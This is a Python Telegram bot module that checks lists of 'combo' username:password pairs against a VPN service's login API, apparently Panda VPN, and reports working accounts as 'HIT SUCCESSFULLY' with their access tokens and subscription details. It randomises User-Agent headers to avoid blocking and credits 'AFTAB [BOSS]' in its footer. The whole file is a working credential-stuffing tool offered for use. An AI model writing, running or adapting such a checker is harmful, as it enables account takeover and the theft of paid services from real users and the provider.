import requests
import time
import random

# User-Agent strings for random selection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36"
]

def process_panda_command(bot, message):
    chat_id = message.chat.id
    account_data = message.text.split()[1:]  # Get the account data from the command
    if account_data:
        total_accounts = len(account_data)
        start_time = time.time()
        results = []
        initial_message = "↯ PANDA VPN CHECKER\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))

        for account in account_data:
            result = check_panda_account(account)
            results.append(f"Combo: {account}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide account details in the format: /panda user:password")

def check_panda_account(account):
    user, password = account.split(':')
    login_url = "https://api.iajee.com/api/v2/users/app/login"
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Connection": "keep-alive"
    }
    data = {
        "account": user,
        "clientVersion": "6.3.0",
        "deviceName": "WIN-HPLUP5LK692-winnt-10.0.19041",
        "deviceToken": "<RANDOM_DEVICE_TOKEN>",
        "deviceType": "WINDOWS",
        "password": password
    }

    response = requests.post(login_url, headers=headers, json=data)
    
    if response.status_code == 200:
        response_json = response.json()
        access_token = response_json.get("accessToken", "")
        web_access_token = response_json.get("webAccessToken", "")
        if access_token and web_access_token:
            account_creation_date = response_json.get("registerAt", "Unknown")
            max_devices = response_json.get("maxDeviceCount", "Unknown")
            left_days = response_json.get("leftDays", 0)
            if left_days > 0:
                expiry_date = response_json.get("dueTime", "Unknown")
                return (f"HIT SUCCESSFULLY\n"
                        f"Access Token: {access_token}\n"
                        f"Web Access Token: {web_access_token}\n"
                        f"Account Creation Date: {account_creation_date}\n"
                        f"Max Devices: {max_devices}\n"
                        f"Expiry Date: {expiry_date}")
            else:
                return "Account Expired❌"
        else:
            return "Invalid Credentials❌"
    else:
        return "Invalid Credentials❌"

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
